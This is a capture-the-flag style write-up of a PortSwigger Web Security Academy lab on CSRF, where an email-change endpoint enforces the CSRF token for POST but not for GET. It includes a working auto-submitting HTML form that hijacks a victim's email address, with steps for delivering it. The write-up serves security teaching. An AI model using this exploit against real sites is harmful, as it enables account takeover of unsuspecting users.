# CSRF Where Token Validation Depends on Request Method

## Overview

This lab demonstrates a **Cross-Site Request Forgery (CSRF)** vulnerability where the application validates the CSRF token for a `POST` request but fails to enforce the same protection when the request is changed to `GET`.

The vulnerable functionality allows an authenticated user to change their email address.

## Vulnerability

The vulnerable endpoint is:

```text
/my-account/change-email
```

A normal email-change request uses the `POST` method and includes a CSRF token:

```http
POST /my-account/change-email HTTP/2
Content-Type: application/x-www-form-urlencoded

email=example@gmail.com&csrf=<CSRF_TOKEN>
```

When attempting to perform the request without a valid CSRF token using the normal `POST` method, the application rejects the request.

However, the application does not properly enforce CSRF protection when the same endpoint is accessed using the `GET` method.

## Steps to Reproduce

### 1. Log in to the Lab

Log in to the PortSwigger Web Security Academy lab using the provided credentials.

Navigate to:

```text
/my-account
```

The account page contains the functionality to change the user's email address.

### 2. Capture the Email Change Request

Change the email address and intercept the request using Burp Suite.

The request looks similar to:

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=example@gmail.com&csrf=<CSRF_TOKEN>
```

The request contains a CSRF token.

### 3. Test CSRF Token Validation

Send the request to Burp Repeater and remove the CSRF token.

For example:

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

email=test@gmail.com
```

The application rejects the request because the `POST` request requires a valid CSRF token.

### 4. Change the Request Method

Modify the request from:

```http
POST /my-account/change-email
```

to:

```http
GET /my-account/change-email
```

The application accepts the request even though the CSRF token is not supplied.

This demonstrates that CSRF protection depends on the HTTP request method.

## Exploit

Create an HTML page that automatically submits a request to the vulnerable endpoint.

```html
<html>
<body>

<form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="attacker@gmail.com">
</form>

<script>
    document.forms[0].submit();
</script>

</body>
</html>
```

Replace `<LAB-ID>` with the actual lab domain.

Replace `attacker@gmail.com` with the email address specified by the lab.

## Exploitation

1. Open the PortSwigger Exploit Server.
2. Paste the exploit HTML into the response body.
3. Click **Store**.
4. Click **Deliver exploit to victim**.
5. The victim's browser automatically sends the `GET` request.
6. The application processes the request using the victim's authenticated session.
7. The victim's email address is changed.

## Why the Attack Works

The application incorrectly assumes that CSRF protection only needs to be applied to the `POST` version of the endpoint.

The attacker changes the request method from `POST` to `GET`.

The server then processes the state-changing request without requiring a valid CSRF token.

The vulnerability can therefore be summarized as:

```text
POST request
    ↓
CSRF token required
    ↓
Request rejected without token

GET request
    ↓
CSRF token not enforced
    ↓
Email changed
```

## Key Learning

- CSRF protection must be consistently enforced on all state-changing requests.
- Changing the HTTP method should not bypass CSRF validation.
- `GET` requests should not normally be used for state-changing operations.
- CSRF tokens should be validated server-side for every request that changes user data.
- Burp Suite Repeater can be used to test whether changing the HTTP method bypasses security controls.
- A vulnerable state-changing `GET` endpoint can allow an attacker to perform actions using the victim's authenticated session.

## Tools Used

- Burp Suite Community Edition
- PortSwigger Web Security Academy
- Burp Suite Repeater
- PortSwigger Exploit Server
- Firefox

## Conclusion

The lab demonstrates a CSRF vulnerability caused by inconsistent CSRF token validation based on the HTTP request method.

Although the application protects the email-change functionality when accessed through `POST`, it fails to apply the same protection to `GET`. An attacker can exploit this behavior by creating a malicious page that automatically sends a `GET` request to the vulnerable endpoint, causing the authenticated victim's email address to be changed.
